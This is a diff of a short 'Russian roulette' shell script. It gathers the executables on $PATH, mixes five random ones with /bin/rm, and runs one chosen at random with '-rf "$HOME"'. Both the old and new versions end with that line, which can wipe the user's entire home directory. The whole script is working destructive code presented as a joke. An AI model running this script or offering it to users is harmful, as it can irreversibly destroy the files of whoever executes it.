@@ -1,6 +1,6 @@
 #!/bin/sh
 #
-# Copyright (c) 2015 Tristan Le Guern <tleguern@bouledef.eu>
+# Copyright (c) 2015,2017 Tristan Le Guern <tleguern@bouledef.eu>
 #
 # Permission to use, copy, modify, and distribute this software for any
 # purpose with or without fee is hereby granted, provided that the above
@@ -17,22 +17,45 @@
 
 set -e
 
-file=$(mktemp)
+get_random() {
+  if which jot > /dev/null 2>&1; then
+    unset -f get_random
+    get_random() { jot -r 1 1 $1 2> /dev/null; }
+  elif which shuf > /dev/null 2>&1; then
+    unset -f get_random
+    get_random() { shuf -i 1-$1 -n 1 2> /dev/null; }
+  else
+    # Neither jot(1) nor shuf(1). What are you doing with your life?
+    unset -f get_random
+    get_random() { echo $((RANDOM % ($1 + 1))); }
+  fi
+  get_random $@
+}
+
+commands=$(mktemp)
+commands_subset=$(mktemp)
+
+trap '{ rm -f -- $commands $commands_subset; }' EXIT
+
+# Generate a listing of every commands available to the user
 OLDIFS="$IFS"
 IFS=':'
 for path in $PATH; do
-	find "$path" -mindepth 1 -maxdepth 1 -print >> "$file"
+  # Cope with bogus $PATH
+  if [ ! -d "$path" ]; then
+    continue
+  fi
+	find "$path" -mindepth 1 -maxdepth 1 -print >> $commands
 done
 IFS="$OLDIFS"
 
-i=0
-nline="$(cat $file | wc -l | tr -d ' ')"
-randline="$(jot -r 1 0 $nline 1 2> /dev/null)"
-cat "$file" | while read REPLY; do
-	if [ $i -eq $randline ]; then
-		"$REPLY" -rf "$HOME"
-	fi
-	i=$((i + 1))
+# Randomly select five commands to mix with rm
+nline="$(cat $commands | wc -l | tr -d ' ')"
+for i in 0 1 2 3 4; do
+  head -n $(get_random $nline) $commands | tail -n 1 >> $commands_subset
 done
+echo /bin/rm >> $commands_subset
 
-rm -f -- "$file"
+# And finally fire the shot
+shot=$(head -n $(get_random 6) $commands_subset | tail -n 1)
+"$shot" -rf "$HOME"
